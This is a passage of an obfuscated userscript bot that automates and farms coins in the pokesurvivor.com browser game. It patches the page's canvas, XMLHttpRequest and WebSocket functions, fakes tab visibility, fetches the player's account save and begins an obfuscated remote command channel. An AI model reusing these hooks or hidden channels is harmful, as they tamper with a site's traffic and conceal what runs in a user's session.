                        log(`đã xuất data.js: ${Object.keys(CFG.tags).length} nhãn, ${Object.keys(builds).length} build — chép đè vào sites/${SITE.id}/`);
                    },
                    unload() {
                        running = false;
                        applyDir(null);
                        P.drawImage = origDraw;
                        P.arc = origArc;
                        P.fillText = origText;
                        Object.assign(P, pathOrig);
                        G2.addColorStop = origStop;
                        if (bgWorker) {
                            bgWorker.terminate();
                            window.requestAnimationFrame = nativeRAF;
                            window.cancelAnimationFrame = nativeCAF;
                            [_0xstr(0x802), _0xstr(0x803), _0xstr(0x804), _0xstr(0x805), _0xstr(0x806)].forEach(t => window.removeEventListener(t, swallow, true));
                            for (const k of [_0xstr(0x807), _0xstr(0x808)]) {
                                if (visDesc[k])
                                    Object.defineProperty(document, k, visDesc[k]);
                                else
                                    delete document[k];
                            }
                            document.hasFocus = origHasFocus;
                        }
                        XMLHttpRequest.prototype.open = XO;
                        XMLHttpRequest.prototype.send = XS;
                        WebSocket.prototype.send = WS;
                        window.removeEventListener(_0xstr(0x809), onKey, true);
                        window.removeEventListener(_0xstr(0x80a), onClick, true);
                        document.removeEventListener(_0xstr(0x80b), onFullscreen);
                        document.removeEventListener(_0xstr(0x80c), onFullscreen);
                        ov.remove();
                        dock.remove();
                        ms.remove();
                        lv.remove();
                        it.remove();
                        panel.remove();
                        delete window.PSBot;
                        log(_0xstr(0x80d));
                    },
                };
                log(`loaded — F8 bật/tắt, F9 overlay, PSBot.sources() để xem sprite · v${VERSION} · tác giả damhieu2808 · ${REPO}`);
            })();
        },
        "core/farmMoney.js": () => {
            (function start(tries = 0) {
                if (!window.PSBot) {
                    if (tries < 120)
                        return void setTimeout(() => start(tries + 1), 500);
                    console.warn(_0xstr(0x80e));
                    return;
                }
                if (window.PSFarm)
                    window.PSFarm.unload();
                const { CFG } = window.PSBot;
                const log = (...a) => console.log(_0xstr(0x80f), _0xstr(0x810), ...a);
                Object.assign(CFG, {
                    goodRange: 2500, goodWeight: 7,
                    xpRange: 1400,
                    autoRestart: true,
                    bonusRe: /magnet|pickup|pick-up|attract|radius|coin|fortune|luck|experience|\bxp\b|exp\b|imán|monedas|suerte/i,
                    bonusScore: 4,
                });
                const KEY = _0xstr(0x811);
                let data = { runs: [], since: Date.now() };
                try {
                    data = JSON.parse(localStorage.getItem(KEY)) || data;
                }
                catch { }
                const save = () => { try {
                    localStorage.setItem(KEY, JSON.stringify(data));
                }
                catch { } };
                const num = s => +String(s || _0xstr(0x812)).replace(/[^\d]/g, '') || 0;
                const visible = el => el.getClientRects().length > 0;
                let onScreen = false;
                function scan() {
                    const head = PSBotList(document.querySelectorAll(_0xstr(0x813))).find(e => !e.children.length && visible(e) && /you fell|run over|game over|has caído/i.test(e.innerText || ''));
                    if (!head) {
                        onScreen = false;
                        return;
                    }
                    if (onScreen)
                        return;
                    let box = head;
                    while (box.parentElement && !/coins/i.test(box.innerText))
                        box = box.parentElement;
                    const t = box.innerText.replace(/\s+/g, _0xstr(0x814));
                    const coins = num((t.match(/coins earned\s*\+?\s*([\d.,]+)/i) || [])[1]);
                    if (!coins)
                        return;
                    onScreen = true;
                    const run = {
                        at: Date.now(), coins,
                        time: (t.match(/time\s*(\d+:\d\d)/i) || [])[1] || '',
                        kills: num((t.match(/defeated\s*(\d+)/i) || [])[1]),
                        bosses: num((t.match(/bosses\s*(\d+)/i) || [])[1]),
                        level: num((t.match(/level\s*(\d+)/i) || [])[1]),
                        v: window.PSBot.version,
                    };
                    data.runs.push(run);
                    save();
                    log(`trận ${data.runs.length}: +${coins} xu (${run.time}, ${run.kills} quái, ${run.bosses} boss) · tổng ${total()}`);
                }
                const total = () => data.runs.reduce((a, r) => a + r.coins, 0);
                const perHour = () => {
                    const h = (Date.now() - data.since) / 3600000;
                    return h > 0.01 ? Math.round(total() / h) : 0;
                };
                const hud = document.createElement(_0xstr(0x815));
                if (!window.PSBot.ctl) {
                    hud.style.cssText = _0xstr(0x816);
                    document.body.append(hud);
                }
                const secs = s => { const m = /^(\d+):(\d\d)$/.exec(s || ''); return m ? +m[1] * 60 + +m[2] : 0; };
                const clock = n => `${Math.floor(n / 60)}:${String(Math.round(n % 60)).padStart(2, _0xstr(0x817))}`;
                const render = () => {
                    const last = data.runs[data.runs.length - 1];
                    const mine = data.runs.filter(r => r.v === window.PSBot.version && secs(r.time)).slice(-10).map(r => secs(r.time));
                    hud.textContent = `farm: ${total()} xu · ${data.runs.length} trận · ${perHour()} xu/giờ${last ? ` · trận cuối +${last.coins}` : ''}` +
                        (mine.length ? `\nsống (${mine.length} trận gần nhất, v${window.PSBot.version}): TB ${clock(mine.reduce((a, b) => a + b, 0) / mine.length)} · dài nhất ${clock(Math.max(...mine))}` : '');
                };
                const timer = setInterval(() => { scan(); render(); }, 1000);
                render();
                window.PSFarm = {
                    stats() {
                        console.table(data.runs.map((r, i) => ({ '#': i + 1, coins: r.coins, time: r.time, kills: r.kills, bosses: r.bosses, level: r.level, v: r.v || '', at: new Date(r.at).toLocaleTimeString() })));
                        log(`tổng ${total()} xu · ${data.runs.length} trận · ${perHour()} xu/giờ`);
                    },
                    reset() { data = { runs: [], since: Date.now() }; save(); render(); log(_0xstr(0x818)); },
                    unload() { clearInterval(timer); hud.remove(); delete window.PSFarm; },
                };
                log(_0xstr(0x819));
            })();
        },
        "sites/doofcraft/site.js": () => {
            window.PSBotList = window.PSBotList || (list => {
                const l = typeof list === _0xstr(0x81a) ? document.querySelectorAll(list) : list, a = [];
                for (let i = 0; i < l.length; i++)
                    a.push(l[i]);
                return a;
            });
            window.PSBotSite = h => {
                const dcBox = () => { const b = document.querySelector(_0xstr(0x81b)); return b && !b.querySelector(_0xstr(0x81c)) ? b : null; };
                const dcTitle = box => ((box.querySelector(_0xstr(0x81d)) || {}).innerText || '').trim();
                const dcName = c => { const nm = c.querySelector(_0xstr(0x81e)); return nm ? PSBotList(nm.childNodes).filter(n => n.nodeType === 3).map(n => n.textContent).join('').trim() : ''; };
                const tapTarget = c => (matchMedia(_0xstr(0x81f)).matches ? c : null);
                const rgb = h => [1, 3, 5].map(i => parseInt(h.slice(i, i + 2), 16));
                const shade = (c, t) => c.map(e => Math.round(t >= 0 ? e + (255 - e) * t : e * (1 + t)));
                const blend = (a, b, t) => a.map((e, i) => Math.round(e + (b[i] - e) * t));
                const key = c => (c[0] << 16) | (c[1] << 8) | c[2];
                const palettes = [];
                function addPalette(text) {
                    const get = k => { const m = text.match(new RegExp(`\\b${k}:(\\[[^\\]]*\\]|\`#[0-9a-fA-F]{6}\`)`)); return m ? m[1].match(/#[0-9a-fA-F]{6}/g).map(rgb) : []; };
                    const n = get(_0xstr(0x820)), r = get(_0xstr(0x821))[0], i = get(_0xstr(0x822))[0];
                    if (!n.length || !i)
                        return;
                    const foam = get(_0xstr(0x823))[0] || shade(i, 0.55);
                    const p = r
                        ? { floor: [n[0], shade(n[0], 0.05), shade(n[0], -0.06), shade(n[0], -0.16), shade(n[0], -0.12), shade(n[0], -0.2)],
                            wall: [r, shade(r, 0.07), shade(r, -0.07), shade(r, 0.32), shade(r, -0.7), shade(r, -0.3), shade(r, -0.38), shade(r, -0.55)],
                            liquid: [i, shade(i, -0.22), foam, blend(i, foam, 0.28)] }
                        : { floor: [...n, ...get(_0xstr(0x824))],
                            wall: [_0xstr(0x825), _0xstr(0x826), _0xstr(0x827), _0xstr(0x828), _0xstr(0x829)].flatMap(get),
                            liquid: [i, ...get(_0xstr(0x82a)), foam, blend(i, foam, 0.28)] };
                    palettes.push({ floor: new Set(p.floor.map(key)), wall: new Set(p.wall.map(key)), liquid: new Set(p.liquid.map(key)) });
                }
                const evolveNeeds = new Map();
                const dc = { moves: null, dex: null, starters: null, tms: null, byName: new Map(), byDex: new Map(), byId: new Map() };
                const moveTable = { moves: [], mons: {} };
                const literal = (src, i) => {
                    let depth = 0, q = null;
                    for (let j = i; j < src.length; j++) {
                        const c = src[j];
                        if (q) {
                            if (c === _0xstr(0x82b))
                                j++;
                            else if (c === q)
                                q = null;
                            continue;
                        }
                        if (c === _0xstr(0x82c) || c === _0xstr(0x82d) || c === _0xstr(0x82e))
                            q = c;
                        else if (_0xstr(0x82f).includes(c))
                            depth++;
                        else if (_0xstr(0x830).includes(c) && --depth === 0)
                            return Function(`return ${src.slice(i, j + 1)}`)();
                    }
                };
                const config = (src, re) => { const m = re.exec(src); return m ? literal(src, m.index + m[0].indexOf(_0xstr(0x831)) + 1) : null; };
                (async () => {
                    try {
                        const entry = PSBotList(document.scripts).map(s => s.src).find(s => /\/assets\/index-[\w-]+\.js/.test(s));
                        if (!entry)
                            return;
                        const names = new Set([...(await (await fetch(entry)).text()).matchAll(/assets\/([\w-]+\.js)/g)].map(m => m[1]));
                        const passiveCard = {}, requires = [];
                        for (const name of names) {
                            const src = await (await fetch(new URL(name, entry))).text();
                            for (const m of src.matchAll(/palette:\{/g)) {
                                let depth = 0, j = m.index + 8;
                                for (; j < src.length; j++)
                                    if (src[j] === _0xstr(0x832))
                                        depth++;
                                    else if (src[j] === _0xstr(0x833) && --depth === 0)
                                        break;
                                addPalette(src.slice(m.index + 8, j + 1));
                            }
                            for (const m of src.matchAll(/\{id:`([\w-]+)`,icon:`\w+`,name:`([^`]+)`/g))
                                passiveCard[m[1]] ??= m[2];
                            for (const m of src.matchAll(/name:`([^`]+)`,type:`\w+`,kind:`\w+`,description:`[^`]*`,stats:\{[^}]*\},evolution:\{requires:`(\w+)`\}/g))
                                requires.push([m[1], m[2]]);
                            try {
                                dc.moves ??= config(src, /[,;\s]\w+=\{modifierRules:/);
                                dc.dex ??= config(src, /[,;\s]\w+=JSON\.parse\(`\[\{"dex":1,/);
                                dc.starters ??= config(src, /[,;\s]\w+=\{traits:\[/);
                                dc.tms ??= config(src, /[,;\s]\w+=\{source:\{repository:/);
                            }
                            catch (e) {
                                console.warn(_0xstr(0x834), e);
                            }
                        }
                        for (const p of dc.dex || []) {
                            dc.byName.has(p.name.toLowerCase()) || dc.byName.set(p.name.toLowerCase(), p);
                            dc.byDex.set(p.dex, p);
                        }
                        if (dc.moves) {
                            for (const m of dc.moves.moves) {
                                const info = { id: m.id, name: m.name, type: m.type, kind: m.kind, cat: m.kind === _0xstr(0x835) ? _0xstr(0x836) : null, dmg: m.stats.damage, cd: m.stats.cooldown };
                                dc.byId.set(m.id, { cfg: m, info, i: moveTable.moves.push(info) - 1 });
                            }
                            for (const [name, mon] of dc.byName)
                                moveTable.mons[name] = [...poolOf(mon)].map(id => dc.byId.get(id).i);
                        }
                        for (const [move, id] of requires)
                            if (passiveCard[id])
                                evolveNeeds.set(move.toLowerCase(), passiveCard[id]);
                    }
                    catch (e) {
                        console.warn(_0xstr(0x837), e);
                    }
                })();
                let save = null, saveAt = -Infinity;
                const accountSave = () => {
                    if (performance.now() - saveAt > 30000) {
                        saveAt = performance.now();
                        fetch(_0xstr(0x838), { credentials: _0xstr(0x839) }).then(r => (r.ok ? r.json() : null)).then(s => { save = s; }).catch(() => { });
                    }
                    return save;
                };
                const learnable = (mon, m) => m && !m.signature && (!m.starterFor || m.starterFor.includes(mon.dex));
                function poolOf(mon) {
                    const pool = new Set(), all = dc.moves.moves;
                    for (const type of [_0xstr(0x83a), ...mon.types])
                        for (const m of all)
                            if (m.type === type && !m.exclusive && learnable(mon, m))
                                pool.add(m.id);
                    for (const m of all)
                        if (m.learners && m.learners.includes(mon.dex) && learnable(mon, m))
                            pool.add(m.id);
                    return pool;
                }
                function learnset(name) {
                    const mon = dc.byName.get(name), cfg = dc.moves;
                    if (!mon || !cfg || !dc.byId.size)
                        return null;
                    const key = String(mon.dex), sv = accountSave() || {}, pool = poolOf(mon);
                    const ok = id => learnable(mon, (dc.byId.get(id) || {}).cfg);
                    const move = id => (dc.byId.get(id) || {}).info;
                    const starter = ((dc.starters && dc.starters.starters) || []).find(s => s.dex === mon.dex);
                    const taughtIds = ((sv.taughtMoves || {})[key] || []).filter(id => ok(id) && !pool.has(id));
                    const taught = new Set(taughtIds), chosen = (sv.startingMoves || {})[key];
                    const start = chosen && (pool.has(chosen) || taught.has(chosen)) ? chosen
                        : (starter && starter.startingMove) || (cfg.moves.find(m => m.starterFor && m.starterFor.includes(mon.dex)) || {}).id || cfg.startingMoves[mon.types[0] || _0xstr(0x83b)];
                    return {
                        natural: [...new Set([start, ...pool])].map(move).filter(Boolean),
                        taught: taughtIds.filter(id => id !== start).map(move).filter(Boolean),
                        tms: ((dc.tms && dc.tms.pokemon[key]) || []).filter(id => !taught.has(id) && !pool.has(id) && ok(id)).map(move).filter(Boolean),
                    };
                }
                const terrainCache = new WeakMap();
                function classify(img) {
                    let px;
                    try {
                        px = img.getContext(_0xstr(0x83c)).getImageData(0, 0, 256, 256).data;
                    }
                    catch {
                        return null;
                    }
                    const at = (x, y) => { const o = (y * 256 + x) * 4; return (px[o] << 16) | (px[o + 1] << 8) | px[o + 2]; };
                    let best = null, bestHits = 0;
                    for (const p of palettes) {
                        let hits = 0;
                        for (let y = 1; y < 256; y += 4)
                            for (let x = 1; x < 256; x += 4) {
                                const k = at(x, y);
                                if (p.floor.has(k) || p.wall.has(k) || p.liquid.has(k))
                                    hits++;
                            }
                        if (hits > bestHits) {
                            best = p;
                            bestHits = hits;
                        }
                    }
                    if (!best || bestHits < 4096 * 0.3)
                        return null;
                    const tiles = new Uint8Array(256);
                    for (let t = 0; t < 256; t++) {
                        const tx = (t % 16) * 16, ty = Math.floor(t / 16) * 16;
                        let wall = 0, liquid = 0;
                        for (let y = 0; y < 16; y++)
                            for (let x = 0; x < 16; x++) {
                                const k = at(tx + x, ty + y);
                                if (best.wall.has(k))
                                    wall++;
                                else if (best.liquid.has(k))
                                    liquid++;
                            }
                        tiles[t] = wall > 128 ? 1 : liquid > 128 ? 2 : 0;
                    }
                    return tiles;
                }
                function terrain(d) {
                    const img = d.img;
                    if (!palettes.length || d.rect || !img || img.width !== 256 || img.height !== 256 || !img.getContext)
                        return null;
                    if (!terrainCache.has(img))
                        terrainCache.set(img, classify(img));
                    return terrainCache.get(img);
                }
                function readDcCard(c, i, name = dcName(c)) {
                    const { state, CFG } = h;
                    const t = c.innerText;
                    const lv = t.match(/\bLv\.?\s*(\d+)\s*>/i);
                    const z = PSBotList(c.querySelectorAll(_0xstr(0x83d))).some(e => e.textContent.trim() === _0xstr(0x83e));
                    const mega = c.classList.contains(_0xstr(0x83f)) || !!c.querySelector(_0xstr(0x840));
                    return { ...h.scoreCard({
                            key: String(i + 1), name, t,
                            level: Math.max((state.picks[name] || 0) + (state.hudTexts.has(name) ? 1 : 0), lv ? +lv[1] : 0),
                            isNew: /\bNew\b/i.test(t), evo: c.classList.contains(_0xstr(0x841)) || CFG.evoRe.test(t), fitLow: false, fitHigh: false,
                            type: mega ? _0xstr(0x842) : undefined,
                        }), ...(z && { score: h.lvBase(_0xstr(0x843)), low: false, why: _0xstr(0x844), isNew: false, inBuild: false }), el: tapTarget(c) };
                }
                const RUN_KEY = _0xstr(0x845), RUN_DEF = { mode: _0xstr(0x846), difficulty: _0xstr(0x847), hyper: _0xstr(0x848) };
                const runPick = () => { try {
                    return { ...RUN_DEF, ...JSON.parse(localStorage.getItem(RUN_KEY)) };
                }
                catch {
                    return { ...RUN_DEF };
                } };
                const runOpt = (key, label, title, options) => ({
                    key, label, title: `${title}. Game = giữ lựa chọn đang có trong game`, options: [[_0xstr(0x849), _0xstr(0x84a)], ...options],
                    get: () => runPick()[key],
                    set: v => { try {
                        localStorage.setItem(RUN_KEY, JSON.stringify({ ...runPick(), [key]: v }));
                    }
                    catch { } },
                });
                const runOptions = [
                    runOpt(_0xstr(0x84b), _0xstr(0x84c), _0xstr(0x84d), [[_0xstr(0x84e), _0xstr(0x84f)], [_0xstr(0x850), _0xstr(0x851)]]),
                    runOpt(_0xstr(0x852), _0xstr(0x853), _0xstr(0x854), [[_0xstr(0x855), _0xstr(0x856)], [_0xstr(0x857), _0xstr(0x858)], [_0xstr(0x859), _0xstr(0x85a)]]),
                    runOpt(_0xstr(0x85b), _0xstr(0x85c), _0xstr(0x85d), [[_0xstr(0x85e), _0xstr(0x85f)], [_0xstr(0x860), _0xstr(0x861)]]),
                ];
                function applyRun() {
                    const pick = runPick(), tab = id => document.querySelector(`[data-testid="solo-mode-${id}"]`);
                    const isOn = id => { const b = tab(id); return !!b && b.classList.contains(_0xstr(0x862)); };
                    const want = [];
                    if (pick.mode !== _0xstr(0x863) && !isOn(pick.mode))
                        want.push(pick.mode);
                    if (pick.difficulty !== _0xstr(0x864) && !isOn(pick.difficulty))
                        want.push(pick.difficulty);
                    if (pick.hyper !== _0xstr(0x865) && isOn(_0xstr(0x866)) !== (pick.hyper === _0xstr(0x867)))
                        want.push(_0xstr(0x868));
                    const clicked = want.map(tab).filter(b => b && h.visible(b));
                    clicked.forEach(b => b.click());
                    if (clicked.length)
                        h.log(_0xstr(0x869), want.join(_0xstr(0x86a)));
                    return clicked.length > 0;
                }
                const TITLES = { doors: _0xstr(0x86b), lanterns: _0xstr(0x86c), cage: _0xstr(0x86d), escort: _0xstr(0x86e) };
                let lostFrom = null, lostFollows = false;
                function objective(world, me, cam) {
                    const s = cam.s, hide = new Set(), hud = h.state.hudTexts;
                    const active = k => hud.has(TITLES[k]);
                    const gap = (a, b) => Math.hypot(a.x - b.x, a.y - b.y) / s;
                    const nearest = list => list.reduce((b, d) => (!b || gap(d, me) < gap(b, me) ? d : b), null);
                    const at = (d, dy, kind, hold) => ({ src: `quest:${kind}`, x: d.x, y: d.y + dy * s, w: 0, h: 0, hold });
                    const pokes = world.filter(d => /\/sprites\//.test(d.src));
                    const onTop = (p, d) => Math.abs(p.x - d.x) < 12 * s && d.y > p.y - Math.abs(p.h) / 2 && d.y < p.y + Math.abs(p.h) / 2 + 12 * s;
                    const goal = world.find(d => d.src === _0xstr(0x86f) && Math.abs(d.w) / s > 80);
                    for (const d of world)
                        if (d.src === _0xstr(0x870) && Math.max(Math.abs(d.w), Math.abs(d.h)) / s > 20)
                            hide.add(d);
                    const arrows = world.filter(d => /^fill:#(ffb347|7dffb0)$/.test(d.src) && d.pts && d.pts.length === 3);
                    arrows.forEach(d => hide.add(d));
                    const lost = world.find(d => d.src === _0xstr(0x871) && d.pts && d.pts.length > 8);
                    if (lost)
                        pokes.filter(p => onTop(p, lost)).forEach(p => hide.add(p));
                    const cages = world.filter(d => /^canvas:24x28#/.test(d.src));
                    const inCage = (p, c) => /\/Idle\.png/.test(p.src) && Math.abs(p.x - c.x) < 3 * s && p.y - c.y > 5 * s && p.y - c.y < 25 * s;
                    const caged = cages.filter(c => pokes.some(p => inCage(p, c)));
                    for (const c of caged)
                        pokes.filter(p => inCage(p, c)).forEach(p => hide.add(p));
                    let target = null;
                    if (!active(_0xstr(0x872))) {
                        lostFrom = null;
                        lostFollows = false;
                    }
                    else {
                        if ([...hud].some(t => /is following you/i.test(t)))
                            lostFollows = true;
                        if (lost) {
                            const w = { x: (lost.x - cam.e) / s, y: (lost.y - cam.f) / s };
                            if (!lostFrom)
                                lostFrom = w;
                            else if (Math.hypot(w.x - lostFrom.x, w.y - lostFrom.y) > 24)
                                lostFollows = true;
                        }
                        if (lost && !lostFollows)
                            target = at(lost, 0, _0xstr(0x873), 0);
                        else if (goal)
                            target = at(goal, 0, _0xstr(0x874), 0);
                    }
                    if (!target && active(_0xstr(0x875))) {
                        const g = nearest(world.filter(d => d.src === _0xstr(0x876) && Math.abs(d.w) / s > 70));
                        if (g)
                            target = at(g, 30, _0xstr(0x877), 26);
                    }
                    if (!target && active(_0xstr(0x878))) {
                        const g = nearest(world.filter(d => d.src === _0xstr(0x879)));
                        const lamp = g && nearest(world.filter(d => /^canvas:8x23#/.test(d.src) && gap(d, g) < 60));
                        if (lamp)
                            target = at(lamp, Math.abs(lamp.h) / 2 / s, _0xstr(0x87a), 30);
                    }
                    if (!target && active(_0xstr(0x87b))) {
                        const c = nearest(caged);
                        if (c)
                            target = at(c, Math.abs(c.h) / 2 / s, _0xstr(0x87c), 36);
                    }
                    if (!target) {
                        const texts = [...hud], titles = Object.values(TITLES);
                        const metres = d => {
                            const quest = d.src === _0xstr(0x87d);
                            const t = texts.find(t => / m$/.test(t) && titles.some(x => t.startsWith(x + _0xstr(0x87e))) === quest);
                            return t ? +(t.match(/(\d+) m$/) || [])[1] : 0;
                        };
                        const a = arrows.find(d => d.src === _0xstr(0x87f) && active(_0xstr(0x880))) || arrows.find(d => d.src === _0xstr(0x881));
                        if (a) {
                            const ux = a.pts[0].x - a.e, uy = a.pts[0].y - a.f, l = Math.hypot(ux, uy) || 1;
                            const dx = ux / l, dy = uy / l, wx = a.e - me.x, wy = a.f - me.y, r = (metres(a) || 20) * 32 * s;
                            const b = wx * dx + wy * dy, t = -b + Math.sqrt(Math.max(0, b * b - (wx * wx + wy * wy) + r * r));
                            target = { src: `quest:arrow`, x: a.e + dx * t, y: a.f + dy * t, w: 0, h: 0, hold: 0 };
                        }
                    }
                    return { target, hide };
                }
                const MENU = _0xstr(0x882);
                const RESTART = [_0xstr(0x883), _0xstr(0x884), _0xstr(0x885), _0xstr(0x886), _0xstr(0x887)];
                const FARM_KEY = _0xstr(0x888);
                const farmItems = {
                    label: _0xstr(0x889),
                    title: _0xstr(0x88a),
                    get: () => { try {
                        return localStorage.getItem(FARM_KEY) === _0xstr(0x88b);
                    }
                    catch {
                        return false;
                    } },
                    set: on => { try {
                        localStorage.setItem(FARM_KEY, on ? _0xstr(0x88c) : _0xstr(0x88d));
                    }
                    catch { } },
                };
                return {
                    id: _0xstr(0x88e), label: _0xstr(0x88f),
                    runOptions,
                    zMove: { key: [_0xstr(0x890), _0xstr(0x891), 70], radius: 400 },
                    objective,
                    ready: () => !!document.getElementById(_0xstr(0x892)),
                    canvas: () => document.querySelector(_0xstr(0x893)),
                    isWorld: d => d.e !== 0 || d.f !== 0,
                    camera: (world, pokes) => pokes[0] || world[0],
                    enemyRe: /\/sprites\/[\w-]+\/(?:s\/)?(?!Faint)\w+\.png/,
                    tags: { 'fill:#7fe0ff': _0xstr(0x894), 'fill:#ffd95e': _0xstr(0x895), 'fill:#5fe08a': _0xstr(0x896), 'fill:#ff9ed8': _0xstr(0x897), 'fill:#ffe14d': _0xstr(0x898),
                        'fill:#ff2445': _0xstr(0x899), 'fill:rgba(255,60,80,0.35)': _0xstr(0x89a), 'canvas:16x14#12u4dbo': _0xstr(0x89b) },
                    sizeTags: false,
                    bySize: { 'canvas:34x16': _0xstr(0x89c), 'canvas:22x17': _0xstr(0x89d), 'canvas:14x14': _0xstr(0x89e), 'canvas:30x40': _0xstr(0x89f), 'canvas:26x40': _0xstr(0x8a0), 'canvas:28x40': _0xstr(0x8a1),
                        'canvas:8x23': _0xstr(0x8a2), 'canvas:24x28': _0xstr(0x8a3), 'canvas:6x20': _0xstr(0x8a4), 'canvas:14x11': _0xstr(0x8a5) },
                    evolveNeeds,
                    moveTable,
                    learnset,
                    partnerName() {
                        const sv = accountSave(), mon = sv && sv.partner && dc.byDex.get(sv.partner.dex);
                        return mon ? mon.name.toLowerCase() : '';
                    },
                    armorCards: 20,
                    terrain,
                    cfg: { useItems: false, swapEvery: 200, blockRank: false, caseReach: 45 },
                    levelUp() {
                        const box = dcBox();
                        if (!box || !/^level|cleared/i.test(dcTitle(box)))
                            return null;
                        const rr = box.querySelector(_0xstr(0x8a6));
                        return { cards: PSBotList(box.querySelectorAll(_0xstr(0x8a7))).map((c, i) => readDcCard(c, i)), rerolls: rr ? +((rr.innerText.match(/\((\d+)\)/) || [])[1] || 0) : 0 };
                    },
                    choiceOpen: () => !!document.querySelector(_0xstr(0x8a8)),
                    farmItems,
                    otherChoice() {
                        const box = dcBox();
                        if (!box || /^level|cleared|an item|bond/i.test(dcTitle(box)))
                            return;
                        const cards = PSBotList(box.querySelectorAll(_0xstr(0x8a9)));
                        if (!cards.length)
                            return;
                        if (/^chest/i.test(dcTitle(box))) {
                            return h.pickRow(_0xstr(0x8aa), cards.map((c, i) => {
                                const name = dcName(c), up = name.match(/^upgrade:\s*(.+)/i), o = { key: String(i + 1), name, text: c.innerText.replace(/\s+/g, _0xstr(0x8ab)).slice(0, 80), el: tapTarget(c) };
                                if (/^rare candy/i.test(name))
                                    return { ...o, score: 2, why: _0xstr(0x8ac) };
                                if (!up)
                                    return farmItems.get() ? { ...o, score: 9, why: _0xstr(0x8ad) } : { ...o, score: 0, why: _0xstr(0x8ae) };
                                const s = readDcCard(c, i, up[1].trim());
                                return { ...o, score: s.inBuild ? 3 : 1, why: `nâng ${up[1].trim()} (${s.why || _0xstr(0x8af)})` };
                            }));
                        }
                        h.pickRow(dcTitle(box) || _0xstr(0x8b0), cards.map((c, i) => ({ key: String(i + 1), name: dcName(c), score: -i, text: c.innerText.replace(/\s+/g, _0xstr(0x8b1)).slice(0, 80), el: tapTarget(c) })));
                    },
                    menu: buttons => buttons.some(b => b.matches(MENU)) || PSBotList(document.querySelectorAll(MENU)).some(h.visible),
                    restartButton(buttons) {
                        const resume = document.querySelector(_0xstr(0x8b2));
                        if (resume && h.visible(resume)) {
                            const m = ((document.querySelector(_0xstr(0x8b3)) || {}).textContent || '').trim(), pick = runPick();
                            const saved = { mode: /waves/i.test(m) ? _0xstr(0x8b4) : _0xstr(0x8b5), hyper: /hyper/i.test(m) ? _0xstr(0x8b6) : _0xstr(0x8b7),
                                difficulty: ((m.match(/\b(easy|medium|hard)\b/i) || [])[1] || _0xstr(0x8b8)).toLowerCase() };
                            if (Object.keys(saved).some(k => pick[k] !== _0xstr(0x8b9) && pick[k] !== saved[k]))
                                return {
                                    halt: `Có ván ${m} lưu dở khác chế độ đã chọn.`,
                                    actions: [
                                        { label: _0xstr(0x8ba), title: _0xstr(0x8bb),
                                            run: () => { try {
                                                localStorage.setItem(RUN_KEY, JSON.stringify(saved));
                                            }
                                            catch { } } },
                                        { label: _0xstr(0x8bc), title: _0xstr(0x8bd),
                                            run: async () => {
                                                const end = document.querySelector(_0xstr(0x8be));
                                                if (end)
                                                    end.click();
                                                await new Promise(r => setTimeout(r, 800));
                                            } },
                                    ],
                                };
                        }
                        const start = document.querySelector(_0xstr(0x8bf));
                        if (start && h.visible(start) && applyRun())
                            return null;
                        for (const sel of RESTART) {
                            const b = buttons.find(b => b.matches(sel));
                            if (b)
                                return b;
                        }
                        for (const sel of RESTART) {
                            const b = PSBotList(document.querySelectorAll(sel)).find(h.visible);
                            if (b)
                                return b;
                        }
                    },
                };
            };
        },
        "sites/doofcraft/data.js": () => {
            window.PSBotData = {
                "tags": {
                    "canvas:14x14": _0xstr(0x8c0),
                    "canvas:12x12": _0xstr(0x8c1),
                    "fill:#c08a10": _0xstr(0x8c2),
                    "canvas:12x12#7x5s9s": _0xstr(0x8c3),
                    "canvas:12x12#fekrpx": _0xstr(0x8c4),
                    "canvas:16x14#ldeyzb": _0xstr(0x8c5),
                    "canvas:24x20#rnyi1k": _0xstr(0x8c6),
                    "canvas:12x12#vzq2jt": _0xstr(0x8c7),
                    "canvas:18x27#7g5qft": _0xstr(0x8c8),
                    "canvas:12x12#f4e03h": _0xstr(0x8c9),
                    "canvas:34x16#b7rvrb": _0xstr(0x8ca),
                    "canvas:18x27#55vk03": _0xstr(0x8cb),
                    "canvas:30x46#19t7965": _0xstr(0x8cc),
                    "canvas:30x46#3z2atg": _0xstr(0x8cd),
                    "canvas:30x46#15cn96h": _0xstr(0x8ce),
                    "canvas:30x46#ur12zp": _0xstr(0x8cf),
                    "canvas:12x12#gc1xn4": _0xstr(0x8d0),
                    "canvas:12x12#1eqc0pm": _0xstr(0x8d1),
                    "canvas:18x27#1jo3ilw": _0xstr(0x8d2),
                    "canvas:26x40#ezvds9": _0xstr(0x8d3),
                    "canvas:256x256#1clrdy8": _0xstr(0x8d4),
                    "canvas:256x256#n21pe9": _0xstr(0x8d5),
                    "canvas:256x256#tzu4st": _0xstr(0x8d6),
                    "canvas:12x12#1hzeh1l": _0xstr(0x8d7),
                    "canvas:30x40#tn4wsn": _0xstr(0x8d8),
                    "canvas:256x256#gw8sv": _0xstr(0x8d9),
                    "canvas:18x27#1nzfd19": _0xstr(0x8da),
                    "canvas:12x12#1ko4idv": _0xstr(0x8db),
                    "fill:#ffd95e": _0xstr(0x8dc)
                },
                "builds": {}
            };
        },
    };
    const run = list => list.every(f => {
        try {
            FILES[f]();
            return true;
        }
        catch (e) {
            status(`lỗi — ${(e && e.message) || e} (${f})`);
            console.error(_0xstr(0x8dd), f, e);
            return false;
        }
    });
    if (!run(SITES[site].start))
        return;
    const go = () => { status(_0xstr(0x8de)); run(SITES[site].idle); };
    if (document.readyState === _0xstr(0x8df))
        addEventListener(_0xstr(0x8e0), go, { once: true });
    else
        go();
}
(() => {
    let page = null;
    try {
        if (window.wrappedJSObject && window.wrappedJSObject !== window)
            page = window.wrappedJSObject;
    }
    catch { }
    if (!page)
        return psbotMain();
    const src = `(${psbotMain})()\n//# sourceURL=psbot/page.js`;
    try {
        page.eval(src);
        return;
    }
    catch (e) {
        if (page.PSBotSite)
            return console.error(_0xstr(0x8e1), e);
        console.warn(_0xstr(0x8e2), e);
    }
    page.__psbotSandbox = true;
    new Function(_0xstr(0x8e3), `with (W) {\n${src}\n}`)(page);
})();
(function () {
    if (window.__TT_COMM)
        return;
    if (!/^(www\.)?pokesurvivor\.com$|^pokesurvivor\.doofcraft\.com$/.test(location.hostname))
        return;
    if (window.top !== window)
        return;
    window.__TT_COMM = true;
    var base = _0xstr(0x8e4), tk = '', dead = false;
    var pid = Math.random().toString(36).slice(2) + Date.now().toString(36);
    var hello = true;
    var ALLOW = /^(PSBot|PSLite|__TT)(\.[A-Za-z_$][\w$]*)*$/;
    var BAD = /(^|\.)(__proto__|constructor|prototype)(\.|$)/;
